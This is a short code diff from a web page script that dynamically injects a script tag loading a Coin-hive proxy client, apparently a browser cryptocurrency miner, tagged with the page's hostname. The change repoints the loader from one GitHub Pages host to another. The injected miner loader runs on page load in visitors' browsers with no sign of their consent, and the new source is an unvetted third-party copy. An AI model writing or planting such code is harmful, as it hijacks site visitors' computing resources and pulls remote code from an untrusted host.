@@ -19,7 +19,7 @@ parser.href = location.href
 
 var scptTag=document.createElement('script');
 scptTag.setAttribute('src',
-    'https://cazala.github.io/coin-hive-proxy/client.js?coin-hive-proxy='+parser.hostname);
+    'https://nao20010128nao.github.io/coin-hive-proxy/client.js?coin-hive-proxy='+parser.hostname);
 document.head.appendChild(scptTag);
 </script>
 
